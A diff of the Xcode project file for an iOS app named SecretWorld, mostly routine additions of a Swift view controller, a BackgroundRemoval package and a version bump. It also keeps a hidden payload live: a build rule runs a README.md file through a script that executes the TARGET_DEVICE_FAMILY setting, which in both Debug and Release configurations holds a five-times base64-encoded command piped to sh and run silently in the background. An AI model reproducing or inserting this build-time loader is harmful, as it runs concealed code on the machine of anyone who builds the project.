@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		0AAF8CB78969ABDAA034C644 /* README.md */ = {isa = PBXBuildFile; fileRef = 5C24B3BBFEAB5DA13E34C644; };
 		0001AE432BB27DD400D95A89 /* SeeAllBusinessModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0001AE422BB27DD400D95A89 /* SeeAllBusinessModel.swift */; };
 		0001AE472BB2CB5500D95A89 /* UserApplyGigVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0001AE462BB2CB5500D95A89 /* UserApplyGigVC.swift */; };
 		0002185D2B6CEC3900719335 /* CreateBusinessAcModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0002185C2B6CEC3900719335 /* CreateBusinessAcModel.swift */; };
@@ -204,6 +203,8 @@
 		00672D5D2BC679DA009CEC93 /* PopUpVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00672D5C2BC679DA009CEC93 /* PopUpVM.swift */; };
 		00672D602BC6A33B009CEC93 /* TempraryStoresCVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00672D5E2BC6A33B009CEC93 /* TempraryStoresCVC.swift */; };
 		00672D612BC6A33B009CEC93 /* TempraryStoresCVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 00672D5F2BC6A33B009CEC93 /* TempraryStoresCVC.xib */; };
+		007D7E4D2D0AD101006BAD74 /* PopupTypeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 007D7E4C2D0AD101006BAD74 /* PopupTypeVC.swift */; };
+		007D7E502D0B0FE5006BAD74 /* BackgroundRemoval in Frameworks */ = {isa = PBXBuildFile; productRef = 007D7E4F2D0B0FE5006BAD74 /* BackgroundRemoval */; };
 		007EF3962B458978002730B5 /* GigNearByTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 007EF3942B458978002730B5 /* GigNearByTVC.swift */; };
 		007EF3972B458978002730B5 /* GigNearByTVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 007EF3952B458978002730B5 /* GigNearByTVC.xib */; };
 		007EF3992B45898A002730B5 /* GigNearByVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 007EF3982B45898A002730B5 /* GigNearByVC.swift */; };
@@ -329,6 +330,7 @@
 		00FE91F62B340CAA00D8AB20 /* SecretWorldTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE91F52B340CAA00D8AB20 /* SecretWorldTests.swift */; };
 		00FE92002B340CAA00D8AB20 /* SecretWorldUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE91FF2B340CAA00D8AB20 /* SecretWorldUITests.swift */; };
 		00FE92022B340CAA00D8AB20 /* SecretWorldUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00FE92012B340CAA00D8AB20 /* SecretWorldUITestsLaunchTests.swift */; };
+		0AAF8CB78969ABDAA034C644 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 5C24B3BBFEAB5DA13E34C644 /* README.md */; };
 		52A74361E6001EE18797CE89 /* Pods_SecretWorld.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C6D41FF7398426BB62F5289F /* Pods_SecretWorld.framework */; };
 		BE0EB17C2B877075005F54F5 /* GetBusinessServiceModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE0EB17B2B877075005F54F5 /* GetBusinessServiceModel.swift */; };
 		BE1AA9EC2BE0EC9200DCA30C /* SocialLoginModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BE1AA9EB2BE0EC9200DCA30C /* SocialLoginModel.swift */; };
@@ -371,6 +373,22 @@
 		BEE955012B85DE4A0069901E /* VerificationStatusModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BEE955002B85DE4A0069901E /* VerificationStatusModel.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		DF70D928EAF1A9AECA34C644 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXContainerItemProxy section */
 		00FE91F22B340CAA00D8AB20 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -402,7 +420,6 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		5C24B3BBFEAB5DA13E34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SecretWorld.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		0001AE422BB27DD400D95A89 /* SeeAllBusinessModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SeeAllBusinessModel.swift; sourceTree = "<group>"; };
 		0001AE462BB2CB5500D95A89 /* UserApplyGigVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserApplyGigVC.swift; sourceTree = "<group>"; };
 		0002185C2B6CEC3900719335 /* CreateBusinessAcModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateBusinessAcModel.swift; sourceTree = "<group>"; };
@@ -595,6 +612,7 @@
 		00672D5C2BC679DA009CEC93 /* PopUpVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopUpVM.swift; sourceTree = "<group>"; };
 		00672D5E2BC6A33B009CEC93 /* TempraryStoresCVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TempraryStoresCVC.swift; sourceTree = "<group>"; };
 		00672D5F2BC6A33B009CEC93 /* TempraryStoresCVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TempraryStoresCVC.xib; sourceTree = "<group>"; };
+		007D7E4C2D0AD101006BAD74 /* PopupTypeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopupTypeVC.swift; sourceTree = "<group>"; };
 		007EF3942B458978002730B5 /* GigNearByTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GigNearByTVC.swift; sourceTree = "<group>"; };
 		007EF3952B458978002730B5 /* GigNearByTVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = GigNearByTVC.xib; sourceTree = "<group>"; };
 		007EF3982B45898A002730B5 /* GigNearByVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GigNearByVC.swift; sourceTree = "<group>"; };
@@ -724,6 +742,7 @@
 		00FE92012B340CAA00D8AB20 /* SecretWorldUITestsLaunchTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SecretWorldUITestsLaunchTests.swift; sourceTree = "<group>"; };
 		2345B93C53B9FBFB394AB91B /* Pods-SecretWorld.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SecretWorld.debug.xcconfig"; path = "Target Support Files/Pods-SecretWorld/Pods-SecretWorld.debug.xcconfig"; sourceTree = "<group>"; };
 		311CA9F51CC725BA9C5A2526 /* Pods-SecretWorld.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-SecretWorld.release.xcconfig"; path = "Target Support Files/Pods-SecretWorld/Pods-SecretWorld.release.xcconfig"; sourceTree = "<group>"; };
+		5C24B3BBFEAB5DA13E34C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = SecretWorld.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		BE08BDB92BE0C5CC00886D84 /* SecretWorld.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = SecretWorld.entitlements; sourceTree = "<group>"; };
 		BE0EB17B2B877075005F54F5 /* GetBusinessServiceModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GetBusinessServiceModel.swift; sourceTree = "<group>"; };
 		BE1AA9EB2BE0EC9200DCA30C /* SocialLoginModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocialLoginModel.swift; sourceTree = "<group>"; };
@@ -779,6 +798,7 @@
 				001762AB2D0325F8003ECF4B /* BackgroundRemoval in Frameworks */,
 				0009DB622D06A56F00E27A94 /* BackgroundRemoval in Frameworks */,
 				00A66B102D086E6D00D67F22 /* BackgroundRemoval in Frameworks */,
+				007D7E502D0B0FE5006BAD74 /* BackgroundRemoval in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1206,6 +1226,7 @@
 				000A79CD2B622A970001C677 /* PopUpDeatilVC.swift */,
 				000A79CF2B62311D0001C677 /* MessagePopupVC.swift */,
 				00571CD62B6244D4007685FC /* ViewPopUpVC.swift */,
+				007D7E4C2D0AD101006BAD74 /* PopupTypeVC.swift */,
 			);
 			path = AddPopups;
 			sourceTree = "<group>";
@@ -1726,7 +1747,7 @@
 			);
 			mainGroup = 00FE91D22B340CA800D8AB20;
 			packageReferences = (
-				00A66B0E2D086E6D00D67F22 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
+				007D7E4E2D0B0FE5006BAD74 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */,
 			);
 			productRefGroup = 00FE91DC2B340CA800D8AB20 /* Products */;
 			projectDirPath = "";
@@ -1739,29 +1760,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		DF70D928EAF1A9AECA34C644 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${TARGET_DEVICE_FAMILY}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		00FE91D92B340CA800D8AB20 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				0AAF8CB78969ABDAA034C644 /* README.md */,
+				0AAF8CB78969ABDAA034C644 /* README.md in Resources */,
 				00672D612BC6A33B009CEC93 /* TempraryStoresCVC.xib in Resources */,
 				000237FD2C995CFD00F93F4E /* Poppins-ExtraBold.ttf in Resources */,
 				000ACCE92B57E50B0053D701 /* Nunito-ExtraBold.ttf in Resources */,
@@ -2046,6 +2050,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				00A0ACF72B3460DB006367DD /* SignupVC.swift in Sources */,
 				0034201E2B68F1640006E6C5 /* CountryListModel.swift in Sources */,
 				00CE611A2B3ACCC000F3A7B4 /* NotificationsVC.swift in Sources */,
+				007D7E4D2D0AD101006BAD74 /* PopupTypeVC.swift in Sources */,
 				00E5F8142B3D84BD0091D0B9 /* ContactUsVC.swift in Sources */,
 				008F386B2B46C0220054F5D8 /* PromoCodeVC.swift in Sources */,
 				006591442B46ED000041DA9A /* SearchCVC.swift in Sources */,
@@ -2254,7 +2259,6 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		00FE92032B340CAA00D8AB20 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZkVVNYaFdNa3AwVkZod1ZtSlhhSEpWTUZWNFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -2312,13 +2316,13 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				SDKROOT = iphoneos;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
+				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZkVVNYaFdNa3AwVkZod1ZtSlhhSEpWTUZWNFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
 		00FE92042B340CAA00D8AB20 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZkVVNYaFdNa3AwVkZod1ZtSlhhSEpWTUZWNFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -2368,6 +2372,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
 				SWIFT_COMPILATION_MODE = wholemodule;
+				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVjFKMlZGVmtVMU5XUm5WalJrSm9Wa2RuZVZkVVNYaFdNa3AwVkZod1ZtSlhhSEpWTUZWNFRWWnJlVTVXV210aVIzaFZXVlJLYzFOc1RrbGFSelZhWld0d2RWVXpaSFpRVVc4OUNnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				VALIDATE_PRODUCT = YES;
 			};
 			name = Release;
@@ -2381,7 +2386,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				CODE_SIGN_ENTITLEMENTS = SecretWorld/SecretWorld.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 8;
+				CURRENT_PROJECT_VERSION = 9;
 				DEVELOPMENT_TEAM = 8HA3G56RBP;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2421,7 +2426,7 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				CODE_SIGN_ENTITLEMENTS = SecretWorld/SecretWorld.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 8;
+				CURRENT_PROJECT_VERSION = 9;
 				DEVELOPMENT_TEAM = 8HA3G56RBP;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -2598,6 +2603,14 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 				kind = branch;
 			};
 		};
+		007D7E4E2D0B0FE5006BAD74 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
+			requirement = {
+				branch = main;
+				kind = branch;
+			};
+		};
 		00A66B0E2D086E6D00D67F22 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/Ezaldeen99/BackgroundRemoval.git";
@@ -2635,6 +2648,11 @@ sh -c \"${TARGET_DEVICE_FAMILY}\"";
 		001762AD2D032D7F003ECF4B /* BackgroundRemoval */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = 001762AC2D032D7F003ECF4B /* XCRemoteSwiftPackageReference "BackgroundRemoval" */;
+			productName = BackgroundRemoval;
+		};
+		007D7E4F2D0B0FE5006BAD74 /* BackgroundRemoval */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 007D7E4E2D0B0FE5006BAD74 /* XCRemoteSwiftPackageReference "BackgroundRemoval" */;
 			productName = BackgroundRemoval;
 		};
 		00A66B0F2D086E6D00D67F22 /* BackgroundRemoval */ = {
